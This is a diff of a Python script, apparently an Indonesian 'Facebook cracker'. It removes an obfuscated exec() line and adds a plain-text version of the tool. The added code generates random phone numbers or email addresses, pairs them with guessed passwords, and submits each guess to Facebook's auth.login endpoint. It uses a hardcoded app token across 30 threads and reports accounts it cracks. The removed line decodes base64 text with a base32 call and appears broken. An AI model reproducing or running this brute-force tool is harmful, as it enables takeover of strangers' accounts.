@@ -1,3 +1,103 @@
-#Recode By Rizky Maulana Sidik
-#Cie Mau Di Recode
-exec(base64.b32decode('aW1wb3J0IG9zLCByZSwgcmVxdWVzdHMsIGNvbmN1cnJlbnQuZnV0dXJlcwpmcm9tIHJhbmRvbSBpbXBvcnQgcmFuZGludAoKZGVmIGJydXRlKHVzZXIsIHBhc3NzKToKICB0cnk6CiAgICBmb3IgcHcgaW4gcGFzc3M6CiAgICAgIHBhcmFtcz17CiAgICAgICAgJ2FjY2Vzc190b2tlbic6ICczNTA2ODU1MzE3MjglN0M2MmY4Y2U5Zjc0YjEyZjg0YzEyM2NjMjM0MzdhNGEzMicsCiAgICAgICAgJ2Zvcm1hdCc6ICdKU09OJywKICAgICAgICAnc2RrX3ZlcnNpb24nOiAnMicsCiAgICAgICAgJ2VtYWlsJzogdXNlciwKICAgICAgICAnbG9jYWxlJzogJ2VuX1VTJywKICAgICAgICAncGFzc3dvcmQnOiBwdywKICAgICAgICAnc2RrJzogJ2lvcycsCiAgICAgICAgJ2dlbmVyYXRlX3Nlc3Npb25fY29va2llcyc6ICcxJywKICAgICAgICAnc2lnJzogJzNmNTU1Zjk5ZmI2MWZjZDdhYTBjNDRmNThmNTIyZWY2JywKICAgICAgfQogICAgICBhcGk9J2h0dHBzOi8vYi1hcGkuZmFjZWJvb2suY29tL21ldGhvZC9hdXRoLmxvZ2luJwogICAgICByZXNwb25zZT1yZXF1ZXN0cy5nZXQoYXBpLCBwYXJhbXM9cGFyYW1zKQogICAgICBpZiByZS5zZWFyY2goJyhFQUFBKVx3KycsIHN0cihyZXNwb25zZS50ZXh0KSk6CiAgICAgICAgcHJpbnQoJyAgW0xJVkVdICVzIC0'))
+#Coded By Rizky Maulana Sidik
+
+import os, re, requests, concurrent.futures
+from random import randint
+
+def brute(user, passs):
+  try:
+    for pw in passs:
+      params={
+        'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
+        'format': 'JSON',
+        'sdk_version': '2',
+        'email': user,
+        'locale': 'en_US',
+        'password': pw,
+        'sdk': 'ios',
+        'generate_session_cookies': '1',
+        'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
+      }
+      api='https://b-api.facebook.com/method/auth.login'
+      response=requests.get(api, params=params)
+      if re.search('(EAAA)\w+', str(response.text)):
+        print('  [LIVE] %s -> %s '%(str(user), str(pw)))
+        break
+      elif 'www.facebook.com' in response.json()['error_msg']:
+        print('  [CHEK] %s -> %s '%(str(user), str(pw)))
+        break
+  except: pass
+
+def random_numbers():
+  data = []
+  os.system('cls' if os.name == 'nt' else 'clear')
+  print('''
+  ♠️♦️👿FACEBOOK CRACKER RANDOM NUMBERS👿♦️♠️
+
+  Isi Nomer Awal Nya Dulu Bro
+  Harus 5 digit gak boleh kurang dan gak boleh lebih.
+  Contoh: 62821
+  ''')
+  kode=str(input('  Masukan nomor awal: '))
+  exit('  Nomor harus 5 digit ya bro ga boleh kurang.') if len(kode) < 5 else ''
+  exit('  Nomor harus 5 digit ya bro ga boleh lebih.') if len(kode) > 5 else ''
+  jml=int(input('''
+  Masukan jumlah nomor yang akan dibuat contoh: 10
+  Jumlah: '''))
+  [data.append({'user': str(e), 'pw':[str(e[5:]), str(e[6:]), str(e[7:])]}) for e in [str(kode)+''.join(['%s'%(randint(0,9)) for i in range(0,8)]) for e in range(jml)]]
+  print('''
+  Semoga Hari Ini Loe Beruntung Bro1🙏🏽👈♥️
+  Tunggu Bentar Lagi Crottttt Ahhhhh.....
+  ''')
+  with concurrent.futures.ThreadPoolExecutor(max_workers=30) as th:
+    {th.submit(brute, user['user'], user['pw']): user for user in data}
+  print('\n  Sudah selesai kak')
+
+def random_email():
+  data = []
+  os.system('cls' if os.name == 'nt' else 'clear')
+  print('''
+  ♣️❤👺 FACEBOOK CRACKER RANDOM EMAIL👺♥️♣️
+
+  Isi Nama Pengguna Nya Dulu Bro
+  Contoh: RizkyGamtenk
+  ''')
+  nama=input('  Nama pengguna: ')
+  domain=input('''
+  Pilih domainya kak [G]mail, [Y]ahoo, [H]otmail
+  pilih (g,y,h): ''').lower().strip()
+  list={
+    'g':'@gmail.com',
+    'y':'@yahoo.com',
+    'h':'@hotmail.com'
+  }
+  exit('  Mohon isi yang bener ya kak.') if not domain in ['g','y','h'] else ''
+  jml=int(input('''
+  Masukan jumlah email yang akan dibuat contoh: 10
+  Jumlah: '''))
+  setpw=input('''
+  Set password yg mendekati nama pengguna
+  contoh: kaka123,kaka1234
+  Set password: ''').split(',')
+  [data.append({'user': nama+str(e)+list[domain], 'pw':[(i) for i in setpw]}) for e in range(1,jml+1)]
+  print('''
+  Semoga Hari Ini Loe Beruntung Sob🙏🏽👈
+  Tunggu Bro Dikit Lagi Mulai Crot.....
+  ''')
+  with concurrent.futures.ThreadPoolExecutor(max_workers=30) as th:
+    {th.submit(brute, user['user'], user['pw']): user for user in data}
+  print('\n  Sudah selesai kak')
+
+def pilih():
+  print('''
+♣️❤👉 1. Crack Dari Nomer Random 👈♥️♣️
+👿♣️👉  2. Crack Dari Email Random 👈♣️👿
+  ''')
+  pil=int(input('  Pilih Yang Mana Bro?: '))
+  if pil == 1:
+    random_numbers()
+  elif pil == 2:
+    random_email()
+  else:
+    exit('  Goblokk')
+ 
+pilih() if __name__ == '__main__' else exit('Maaf ada yang error bro , silahkan coba lagi yahh.')
